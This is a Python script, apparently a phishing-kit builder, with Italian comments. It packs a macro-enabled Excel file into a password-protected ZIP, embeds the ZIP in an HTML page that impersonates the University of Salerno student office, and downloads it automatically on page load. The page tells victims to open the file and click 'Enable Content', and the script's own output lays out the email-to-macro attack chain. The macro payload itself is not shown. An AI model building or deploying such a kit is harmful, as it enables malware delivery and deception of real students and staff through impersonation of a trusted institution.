import base64
import os
import subprocess
import sys

xlsm_file    = "IngegneriaMeccanicaUNISA.xlsm"
zip_output   = "Academic_Transcript.zip"
html_output  = "index.html"
zip_password = "Unisa2026"

# ── Verifica file sorgente ────────────────────────────────────────────
if not os.path.exists(xlsm_file):
    print(f"[-] Error: {xlsm_file} not found")
    sys.exit(1)

# ── Crea ZIP con password (AES-256) ───────────────────────────────────
try:
    import pyzipper
except ImportError:
    print("[*] Installo pyzipper...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyzipper", "-q"])
    import pyzipper

with pyzipper.AESZipFile(zip_output, 'w',
                          compression=pyzipper.ZIP_DEFLATED,
                          encryption=pyzipper.WZ_AES) as zf:
    zf.setpassword(zip_password.encode())
    zf.write(xlsm_file, "Academic_Transcript.xlsm")

print(f"[+] ZIP creato: {zip_output}  (password: {zip_password})")

# ── Base64 del ZIP ────────────────────────────────────────────────────
with open(zip_output, "rb") as f:
    b64_data = base64.b64encode(f.read()).decode("utf-8")

# ── Pagina HTML: auto-download ZIP + istruzioni ───────────────────────
html_content = f"""<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>University Portal — UNISA</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .card {{
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,.12);
            padding: 48px 40px;
            max-width: 460px;
            width: 100%;
            text-align: center;
        }}
        .logo {{
            font-size: 32px;
            font-weight: 700;
            color: #003087;
            margin-bottom: 6px;
            letter-spacing: -1px;
        }}
        .subtitle {{
            color: #888;
            font-size: 13px;
            margin-bottom: 32px;
        }}
        .spinner {{
            width: 44px; height: 44px;
            border: 4px solid #e0e7ef;
            border-top-color: #003087;
            border-radius: 50%;
            animation: spin .9s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .status {{
            color: #333;
            font-size: 15px;
            margin-bottom: 28px;
        }}
        .password-box {{
            background: #f5f7fa;
            border: 1px solid #d0d7e2;
            border-radius: 8px;
            padding: 16px 20px;
            margin-top: 8px;
            text-align: left;
        }}
        .password-box p {{
            font-size: 13px;
            color: #555;
            margin-bottom: 8px;
        }}
        .password-box .pwd {{
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: bold;
            color: #003087;
            letter-spacing: 2px;
        }}
        .instructions {{
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            line-height: 1.7;
            text-align: left;
        }}
        .instructions b {{ color: #555; }}
    </style>
</head>
<body>
<div class="card">
    <div class="logo">UNISA</div>
    <div class="subtitle">Università degli Studi di Salerno — Segreteria Studenti</div>
    <div class="spinner"></div>
    <div class="status">Il tuo documento è pronto.<br>Download in corso...</div>
    <div class="password-box">
        <p>Il file è protetto da password:</p>
        <div class="pwd">{zip_password}</div>
    </div>
    <div class="instructions">
        <b>Come aprire il file:</b><br>
        1. Attendi il completamento del download<br>
        2. Apri il file ZIP con <b>7-Zip</b> o WinRAR<br>
        3. Inserisci la password indicata sopra<br>
        4. Apri il file Excel estratto e clicca <b>Abilita contenuto</b>
    </div>
</div>
<script>
    var b64  = "{b64_data}";
    var name = "Academic_Transcript.zip";
    var bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    var blob  = new Blob([bytes], {{type: "application/zip"}});
    var a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = name;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
</script>
</body>
</html>"""

with open(html_output, "w", encoding="utf-8") as f:
    f.write(html_content)

zip_kb = os.path.getsize(zip_output) // 1024
html_kb = os.path.getsize(html_output) // 1024
print(f"[+] {html_output} generato  ({html_kb} KB)")
print(f"[+] Flusso: email → link /transcript → download ZIP → 7-Zip → xlsm → macro")
print(f"[+] Password da comunicare nella email: {zip_password}")
